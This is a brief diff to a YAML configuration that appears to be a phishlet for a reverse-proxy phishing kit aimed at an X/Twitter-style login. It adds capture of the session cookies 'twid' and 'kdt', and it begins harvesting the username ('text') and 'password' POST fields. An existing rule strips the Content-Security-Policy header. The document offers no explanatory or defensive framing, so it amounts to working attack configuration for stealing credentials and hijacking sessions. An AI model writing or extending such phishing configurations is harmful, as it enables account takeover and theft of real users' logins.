@@ -11,7 +11,11 @@ auth_tokens:
   - {type: "cookie", name: "ct0"}
   - {type: "cookie", name: "guest_id"}
   - {type: "cookie", name: "personalization_id"}
-credentials: []
+  - {type: "cookie", name: "twid"}
+  - {type: "cookie", name: "kdt"}
+credentials:
+  - {type: "post_param", name: "text", regex: null}
+  - {type: "post_param", name: "password", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
